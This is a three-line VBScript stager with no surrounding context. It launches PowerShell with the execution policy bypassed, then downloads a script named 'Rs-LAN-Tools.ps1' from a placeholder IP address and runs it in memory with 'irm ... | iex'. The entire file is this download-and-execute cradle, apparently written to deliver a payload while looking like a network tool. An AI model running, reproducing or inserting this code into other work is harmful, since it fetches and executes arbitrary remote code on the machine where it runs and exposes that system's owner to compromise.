Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -Ep Bypass -C $stage = 'y'; irm http://<IP>/HyEnkNkU/Rs-LAN-Tools.ps1 | iex"
